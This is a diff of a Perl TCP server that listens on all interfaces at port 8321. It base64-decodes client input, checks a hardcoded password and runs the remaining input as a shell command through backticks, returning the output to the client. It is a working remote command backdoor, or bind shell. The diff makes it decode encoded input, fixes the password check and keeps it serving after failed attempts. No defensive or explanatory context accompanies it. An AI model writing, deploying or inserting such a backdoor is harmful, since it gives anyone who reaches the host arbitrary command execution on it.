@@ -1,9 +1,8 @@
 use IO::Socket::INET;
+use MIME::Base64;
 
-# auto-flush on socket
 $| = 1;
 
-# creating a listening socket
 my $socket = new IO::Socket::INET (
     LocalHost => '0.0.0.0',
     LocalPort => '8321',
@@ -15,7 +14,7 @@ die "NO SOCKET CREATED $!\n" unless $socket;
 
 print "listening 8321\n";
 
-my $our_key = "MYSECRET";
+my $our_key = "seven";
 while(1)
 {
 
@@ -27,18 +26,13 @@ while(1)
     # read up to 1024 characters from the connected client
     my $data = "";
     $client_socket->recv($data, 1024);
-    print "DATA $data";
-    print "---------------";
+
+    $data = decode_base64($data);
     my $password =  (split(/\n/, $data))[-1];
     $data =  (split(/\n/, $data))[0];
     print $password;
     print $our_key;
-    if ($password != $our_key) {
-      print $client_socket "$.: NO!";
-      shutdown($client_socket, 1);
-      $socket->close();
-      last;
-    } else {
+    if ($password eq $our_key) {
 
       print "data $data";
       print "Client req: $data\n";
@@ -46,8 +40,10 @@ while(1)
       print "[$client_address $client_port] $_";
       my @out = `$data`;
       print $client_socket "$.: @out";
-      shutdown($client_socket, 1);
+    } else {
+      print $client_socket "$.: Bye";
     }
+    shutdown($client_socket, 1);
 }
 
 $socket->close();
